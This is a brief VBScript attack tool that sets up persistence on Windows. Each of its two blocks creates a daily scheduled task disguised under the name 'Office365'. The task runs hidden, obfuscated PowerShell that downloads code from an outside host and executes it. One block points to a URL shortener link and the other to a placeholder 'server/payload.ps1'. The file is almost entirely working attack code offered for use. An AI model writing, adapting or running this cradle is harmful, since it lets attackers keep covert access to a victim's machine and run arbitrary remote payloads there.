#This .vbs scripts can be used, to create a taskschedule persistence with a not proxy aware PowerShell Download Cradle 

Dim objShell
	Set WshShell = CreateObject("WScript.Shell")
	Connect="cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR ""pOwErsHelL -w hidDEn -nOpR  -coM 'I`eX (N`E`W`-obje`CT Net.Webclient).\\\""dowNloa`DST`RIng\\\""((\\\""https://cutt.ly/WS8Vek5\\\""))"""	
	WshShell.Run Connect, 0, true
Set objShell = Nothing
	
	
	
Dim objShell
	Set WshShell = CreateObject("WScript.Shell")
	Connect="cmd.exe /c SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR ""pOwErsHelL -w HIdDEn -nOPr  -co 'i`Ex (N`E`W`-obje`CT Net.Webclient).\\\""dowNloa`DST`RIng\\\""((\\\""ht\\\""+\\\""tps://server/payload.ps1\\\""))"""	
	WshShell.Run Connect, 0, true
Set objShell = Nothing
	
	
	
	
